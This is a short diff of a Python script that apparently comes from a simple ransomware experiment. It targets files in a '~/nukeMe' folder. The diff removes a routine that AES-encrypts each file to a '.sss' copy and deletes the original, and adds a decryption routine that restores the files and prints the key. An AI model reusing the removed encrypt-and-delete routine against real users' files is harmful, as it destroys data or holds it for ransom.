@@ -15,20 +15,12 @@ except:
     print("Already nuked")
     quit()
 
-# encryption
-def aesEncrypt():
-    encryptThis = target     #target
-    global encryptDone 
-    encryptDone = str(encryptThis + ".sss")
-    pyAesCrypt.encryptFile(encryptThis, encryptDone, key, bufferSize)
-
-
-def destroyOriginal():
-#removing the plain text key file immediately after usage
-    if os.path.exists(target):
-        os.remove(target)
-    else:
-        pass
+#decryption
+def aesDecrypt():
+    decryptThis = target
+    pyAesCrypt.decryptFile(decryptThis, decryptOutput , key, bufferSize)
+    print("decrypt me ", decryptThis)
+    print(key)
 
 #Setting the target path "My Documents"
 targetPath = os.path.expanduser('~/nukeMe')
@@ -36,15 +28,14 @@ rootdir = os.path.expandvars(targetPath)
 
 #targetPath2Raw = R"C:\Users\$USERNAME\nukeMe"
 
-#Encrypting files in My Documents WINDOWS
+
+#Decrypting files in My Documents WINDOWS
 for subdir, dirs, files in os.walk(rootdir):
     for file in files:
         try:
             target = rootdir + "/" + str(file)
-            print(target)
-            aesEncrypt()   
-            destroyOriginal()
-            #break
+            decryptOutput = target.replace('.sss','')
+            aesDecrypt()   
         except:
             pass
-
+            
